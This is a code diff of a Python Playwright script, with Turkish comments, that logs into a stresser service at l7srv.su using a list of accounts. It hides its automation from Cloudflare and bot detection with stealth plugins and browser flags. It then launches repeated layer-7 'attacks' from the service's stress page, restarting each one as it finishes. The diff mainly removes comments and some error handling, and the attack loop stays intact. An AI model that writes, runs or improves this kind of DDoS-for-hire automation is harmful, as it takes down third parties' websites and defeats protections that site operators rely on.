@@ -3,7 +3,7 @@ import time
 import os
 import sys
 from rebrowser_playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
-from playwright_stealth import stealth_sync  # Cloudflare'ı aşmak için kritik
+from playwright_stealth import stealth_sync
 
 ACCOUNTS_FILE = "accounts.txt"
 MAX_CONCURRENT = 2
@@ -61,63 +61,32 @@ def attack_worker(account):
                         "--no-sandbox",
                         "--disable-dev-shm-usage",
                         "--disable-gpu",
-                        "--disable-blink-features=AutomationControlled",  # automation detection'ı devre dışı bırak
+                        "--disable-blink-features=AutomationControlled",
                         "--disable-features=IsolateOrigins,site-per-process"
                     ],
-                    slow_mo=250  # Daha doğal hız
+                    slow_mo=250
                 )
                 page = context.new_page()
-                
-                # ---------- STEALTH EKLENTİSİ (tüm detection'ları gizler) ----------
                 stealth_sync(page)
 
-                # ---------- GİRİŞ YAP ----------
+                # Giriş
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
-                    # Cloudflare challenge'ı geçmesi için uzun süre ve networkidle
-                    response = page.goto("https://l7srv.su/login", timeout=120000, wait_until="networkidle")
-                    
-                    # Eğer Cloudflare challenge sayfasına yönlendirdiyse, geçmesini bekle
+                    page.goto("https://l7srv.su/login", timeout=120000, wait_until="networkidle")
                     if "cf-browser-verification" in page.url or "challenge" in page.url:
                         print(f"[{username}] ⚡ Cloudflare challenge algılandı, geçilmesi bekleniyor...")
-                        page.wait_for_timeout(10000)  # 10 saniye bekle, otomatik geçmezse sayfa yenilenir
+                        page.wait_for_timeout(10000)
                         page.reload(wait_until="networkidle")
                         page.wait_for_timeout(5000)
 
-                    if response and response.status >= 400:
-                        print(f"[{username}] 🛑 HTTP {response.status} - Engelleniyor olabilir, yeniden deneniyor.")
-                        raise Exception(f"HTTP {response.status}")
-
-                    # #username alanını bekle (30 saniye)
                     page.wait_for_selector("#username", timeout=30000)
-                    print(f"[{username}] ✅ Sayfa yüklendi, form alanları bulundu.")
-
                     page.fill("#username", username)
                     page.fill("#password", password)
                     page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
                     page.click("#loginNextBtn")
-                    
-                    # Dashboard'a yönlendirilme kontrolü
                     page.wait_for_url(lambda url: "/dash" in url, timeout=90000)
                     print(f"[{username}] ✅ Giriş başarılı!")
                     consecutive_errors = 0
-
-                except PlaywrightTimeout as timeout_err:
-                    print(f"[{username}] ❌ Zaman aşımı: {timeout_err}")
-                    try:
-                        print(f"[{username}] 📍 Mevcut URL: {page.url}")
-                        # Eğer Cloudflare'de kaldıysa ekstra bekle
-                        if "challenge" in page.url:
-                            print(f"[{username}] 🔄 Challenge sayfasında, 15 saniye beklenip yeniden deneniyor...")
-                            time.sleep(15)
-                    except:
-                        pass
-                    context.close()
-                    consecutive_errors += 1
-                    wait_time = 60 if consecutive_errors < 3 else 180
-                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
-                    time.sleep(wait_time)
-                    continue
                 except Exception as login_err:
                     print(f"[{username}] ❌ Giriş hatası: {login_err}")
                     context.close()
@@ -127,7 +96,7 @@ def attack_worker(account):
                     time.sleep(wait_time)
                     continue
 
-                # ---------- STRESS SAYFASI ----------
+                # Stress sayfası
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
                     page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="networkidle")
@@ -145,7 +114,7 @@ def attack_worker(account):
                     time.sleep(wait_time)
                     continue
 
-                # ---------- ANA SALDIRI DÖNGÜSÜ ----------
+                # Ana döngü
                 while True:
                     try:
                         page.wait_for_selector("#l7host", timeout=15000)
@@ -157,7 +126,6 @@ def attack_worker(account):
                         print(f"[{username}] 🔥 Saldırı başladı | {time_value} sn")
                         consecutive_errors = 0
 
-                        # Saldırı durumu takibi
                         while True:
                             no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                             if no_attacks.count() > 0 and no_attacks.is_visible():
@@ -171,13 +139,11 @@ def attack_worker(account):
                                     break
                             time.sleep(2)
 
-                        # Sayfayı yenile ve tekrar hazırlan
                         page.reload(wait_until="networkidle")
                         page.wait_for_timeout(3000)
                         page.wait_for_selector("#layer_7", timeout=15000)
                         page.locator("#layer_7").click()
                         page.wait_for_timeout(1000)
-
                     except Exception as inner_err:
                         print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                         consecutive_errors += 1
@@ -187,7 +153,6 @@ def attack_worker(account):
                         except:
                             pass
                         continue
-
         except Exception as outer_err:
             print(f"[{username}] 💥 Kritik hata: {outer_err}")
             consecutive_errors += 1
